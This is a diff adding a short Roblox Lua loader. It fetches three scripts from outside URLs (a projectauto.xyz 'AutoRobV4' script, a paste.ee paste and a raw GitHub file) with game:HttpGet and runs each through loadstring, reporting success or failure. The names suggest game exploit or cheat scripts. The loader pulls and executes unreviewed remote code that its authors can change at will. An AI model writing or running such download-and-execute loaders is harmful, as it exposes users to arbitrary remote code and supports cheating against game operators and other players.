@@ -1,0 +1,21 @@
+local scriptsToLoad = {
+    script1 = "loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoRobV4'))()",
+    script2 = "loadstring(game:HttpGet('https://paste.ee/r/8cWac/0', true))()",
+    script3 = "loadstring(game:HttpGet('https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt', true))()",
+    script4 = [[
+        -- This is a multi-line script
+        for i = 1, 5 do
+            print('Looping from Script 4: ' .. i)
+        end
+    ]]
+}
+
+-- Loop through each script and execute
+for name, code in pairs(scriptsToLoad) do
+    local success, result = pcall(loadstring(code))
+    if success then
+        print(name .. " loaded successfully!")
+    else
+        warn("Error loading " .. name .. ": " .. result)
+    end
+end
